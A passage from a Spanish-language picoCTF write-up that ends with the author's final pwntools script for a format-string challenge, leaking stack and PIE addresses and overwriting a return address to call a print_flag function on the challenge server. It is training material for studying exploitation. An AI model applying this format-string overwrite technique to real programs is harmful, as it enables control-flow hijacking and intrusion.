Ret addr: 0x7ffc4c7c0668
120
</code></pre><p>Para solucionarlo, añadí el parámetro write_size especificando &lsquo;short&rsquo;, con esto el payload generado pasa de ser de 120 a 64. Y al ejecutarlo en remoto muestra la flag.</p><p><strong>Script Final:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./valley_patched&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>exe</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>gdb_script</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>b main
</span></span></span><span class=line><span class=cl><span class=s1>continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gdb_script</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;shape-facility.picoctf.net&#34;</span><span class=p>,</span> <span class=mi>55189</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>conn</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>offset_fmstr</span> <span class=o>=</span> <span class=mi>6</span>
</span></span><span class=line><span class=cl>    <span class=n>offset_main_addr</span> <span class=o>=</span> <span class=mh>0x1413</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Shouting:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;%21$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>output</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;You heard in the distance: &#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>output</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Leaked address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>output</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pie_base</span> <span class=o>=</span> <span class=n>output</span> <span class=o>-</span> <span class=n>offset_main_addr</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Pie base: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>pie_base</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>offset_print_flag</span> <span class=o>=</span> <span class=mh>0x0000000000001269</span>
</span></span><span class=line><span class=cl>    <span class=n>print_flag</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=n>offset_print_flag</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Print flag: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>print_flag</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;%20$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>output</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;You heard in the distance: &#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>output</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Leaked address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>output</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ret_addr</span> <span class=o>=</span> <span class=n>output</span> <span class=o>-</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Ret addr: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=p>{</span><span class=n>ret_addr</span><span class=p>:</span> <span class=n>print_flag</span><span class=p>},</span> <span class=n>write_size</span><span class=o>=</span><span class=s1>&#39;short&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;exit&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M5 12l6 6"/><path d="M5 12l6-6"/></svg></div><div class="d-flex flex-column"><div class=text-body-secondary>Prev</div><a href=/ctf/picoctf/binaryexplotation/format-strings-3/ class="stretched-link text-reset text-decoration-none">Format strings 3</a></div></div></div><div class=m-2></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/ctf/picoctf/binaryexplotation/format-strings-2/ class="stretched-link text-reset text-decoration-none">Format strings 2</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div><script src=/js/main.js></script></body></html>